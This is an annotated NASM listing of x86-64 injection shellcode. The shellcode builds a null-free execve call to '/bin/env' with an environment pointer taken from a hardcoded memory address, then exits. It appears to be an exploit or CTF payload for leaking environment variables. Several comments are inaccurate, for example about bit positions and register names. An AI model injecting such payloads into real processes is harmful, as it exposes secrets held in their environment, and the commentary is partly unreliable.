     1                                  bits 64 
     2                                          ; find out where we are
     3                                  start:  ; code start
     4                                  
     5                                        ; zeroing out rax by XORing it with itself
     6                                        ; rax is often used for system call numbers and return values from system calls
     7 00000000 4831C0                        xor rax, rax
     8                                        ; pushing command name onto the stack
     9                                        ; this will act as a null terminator for a string array later
    10 00000003 50                            push rax
    11                                        ; the address of the string '/bin/env' is moved into rdi and pushed onto the stack, indicating a command to be executed
    12 00000004 48BF2F62696E2F656E-           mov rdi, '/bin/env'
    12 0000000D 76                 
    13 0000000E 57                            push rdi
    14                                        ; put address of command in rdi
    15 0000000F 4889E7                        mov rdi, rsp
    16                                        ; creating argv array  
    17 00000012 50                            push rax
    18 00000013 57                            push rdi
    19                                        ; move stack pointer into rsi, rsi will point to the argv array.
    20 00000014 4889E6                        mov rsi, rsp
    21                                        
    22                                        ; setting up rdx (environment variable pointer)
    23                                        ; clear the rdx register (all 0 bits)
    24 00000017 4831D2                        xor rdx, rdx
    25                                        ; load 0x7fff into the low 16 bits of the rdx register (called dx)
    26 0000001A 66BAFF7F                      mov dx, 0x7fff
    27                                        ; left shift the rdx register by 32 bits (to bits 33 to 47)
    28 0000001E 48C1E220                      shl rdx, 32
    29                                        ; load 0xf7fbe6ff into the low 32 bits of rcx (called ecx, this also clears the rest of rex)
    30 00000022 B9FFE6FBF7                    mov ecx, 0xf7fbe6ff
    31                                        ; clear the low 8 bits of the rcx register (called cl)
    32 00000027 30C9                          xor cl, cl
    33                                        ; combine the registers using the or instruction
    34 00000029 4809CA                        or rdx, rcx
    35                                        ; load the rdx register with the memory pointed to by the rdx register
    36 0000002C 488B12                        mov rdx, [rdx]
    37                                        
    38                                        ; system call number for execve (which executes a program) is moved into the al register (which is the lower 8 bits of rax), and the syscall instruction is executed
    39                                        ; this should run the '/bin/env' command with the given argv and environment variables.
    40 0000002F B03B                          mov al, 0x3b
    41                                        ; system call to execute command
    42 00000031 0F05                          syscall
    43                                        ; the return value (in rax) is moved into rdi, and another system call is prepared
    44 00000033 4889C7                        mov rdi, rax
    45 00000036 B03C                          mov al, 0x3c
    46                                        ; system call executed with number 0x3c
    47 00000038 0F05                          syscall
    48                                        ; section reserves space to ensure that the stack does not overflow into the code
    49                                        ; dq is an instruction to define a quad word (64 bits), and 0xffffffffffffffff is just a filler value
    50 0000003A FFFFFFFFFFFFFFFF              dq 0xffffffffffffffff
    51 00000042 FFFFFFFFFFFFFFFF              dq 0xffffffffffffffff
    52 0000004A FFFFFFFFFFFFFFFF              dq 0xffffffffffffffff
    53 00000052 FFFFFFFFFFFFFFFF              dq 0xffffffffffffffff
    54 0000005A FFFFFFFFFFFFFFFF              dq 0xffffffffffffffff
    55 00000062 62000000                end:  dd end-start
